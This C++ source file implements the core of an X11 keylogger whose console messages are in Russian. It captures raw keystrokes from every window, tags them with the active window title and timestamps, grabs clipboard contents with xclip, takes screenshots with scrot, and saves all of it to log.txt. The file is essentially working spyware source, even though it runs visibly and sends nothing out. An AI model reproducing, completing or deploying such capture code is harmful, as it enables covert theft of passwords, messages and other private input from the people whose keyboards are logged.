#include "application.hpp"
#include <iostream>
#include <stdexcept>

#include "../utils/common/common.hpp"
#include "../utils/windowTrackingHelper/windowTracking.hpp"

Application::Application() : keyboardHandler_(nullptr) { 
    initializeX11();
    keyboardHandler_ = KeyboardEventHandler(display_);
    std::cout << "Пассивный перехват запущен. Нажимайте клавиши..." << std::endl;
    std::cout << "Нажмите Escape для выхода." << std::endl;
}

Application::~Application() {
    if (display_) {
        std::cout << "\nЗавершение работы... Запись лога..." << std::endl;
        trimLeadingNewlines(logBuffer_);
        writeLog(logBuffer_, "log.txt"); 
        std::cout << "Лог записан в log.txt" << std::endl;
        XCloseDisplay(display_);
    }
}

void Application::initializeX11() {
    display_ = XOpenDisplay(NULL);
    if (!display_) {
        throw std::runtime_error("Не удалось подключиться к X-серверу.");
    }

    rootWindow_ = DefaultRootWindow(display_);
    
    XIEventMask evmask;
    unsigned char mask_bytes[XI_LASTEVENT / 8 + 1] = {0}; 
    XISetMask(mask_bytes, XI_RawKeyPress);
    XISetMask(mask_bytes, XI_RawKeyRelease);
    
    evmask.deviceid = XIAllMasterDevices; 
    evmask.mask_len = sizeof(mask_bytes);
    evmask.mask = mask_bytes;

    XISelectEvents(display_, rootWindow_, &evmask, 1);
    XFlush(display_);
}

void Application::run() {
    while (isRunning_) {
        processEvents();
    }
}

void Application::processEvents() {
    XEvent xevent;
    XNextEvent(display_, &xevent);

    updateActiveWindow();
        
    ProcessedEvent result = keyboardHandler_.handleEvent(xevent);
    handleAction(result);
}

void Application::updateActiveWindow() {
    std::string newWindowName = windowTracking(display_);
    if (newWindowName != currentWindowName_ && !newWindowName.empty()) {
        currentWindowName_ = newWindowName;
        logBuffer_ += "\n\n\n" + getCurrentTimestamp() + " - [Active Window: " + currentWindowName_ + "]\n\n"; 
    }
}

void Application::handleAction(const ProcessedEvent& result) {
    if (!result.printable_name.empty()) {
        std::cout << "Нажата клавиша: " << result.printable_name << std::endl;
    }

    switch (result.action) {
        case KeyboardAction::EXIT_APP:
            isRunning_ = false; 
            break;

        case KeyboardAction::CAPTURE_CLIPBOARD: {
            std::string clipboard_text = exec("xclip -selection clipboard -o");
            std::cout << "Copied: " << clipboard_text << std::endl;
            logBuffer_ += "\n\n" + getCurrentTimestamp() + " - Copied:[\n" + clipboard_text + "\n]\n";
            break;
        }

        case KeyboardAction::CAPTURE_SCREEN: {
            std::cout << "PrintScreen нажат. Делаю скриншот..." << std::endl;
            system("mkdir -p ../screenshots");
            std::string filename = getCurrentTimestamp();
            std::string command = "scrot '../screenshots/screenshot_" + filename + ".png'";
            system(command.c_str());
            std::cout << "Скриншот сохранен в папке 'screenshots'." << std::endl;
            break;
        }

        case KeyboardAction::LOG_TEXT:
            logBuffer_ += result.text_to_log;
            break;

        case KeyboardAction::HANDLE_BACKSPACE:
            if (!logBuffer_.empty()) {
                logBuffer_.pop_back();
            }
            break;
        
        case KeyboardAction::NONE:
        default:
            break;
    }
}